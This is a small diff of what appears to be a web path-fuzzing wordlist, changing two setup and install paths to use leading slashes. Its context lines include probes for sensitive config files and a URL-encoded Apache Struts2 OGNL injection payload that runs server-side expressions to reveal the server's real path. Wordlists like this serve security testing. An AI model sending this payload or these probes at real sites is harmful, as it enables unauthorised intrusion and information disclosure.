@@ -46,8 +46,8 @@ _wpeprivate/config.json
 .vscode/sftp.json~
 .well-known/security.txt
 *
-scripts/setup.php
-wp-admin/install.php
+/scripts/setup.php
+/wp-admin/install.php
 \xc2\xac/scripts/setup.php
 %28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f
 %62%61%73%65/%70%6F%73%74%2E%70%68%70
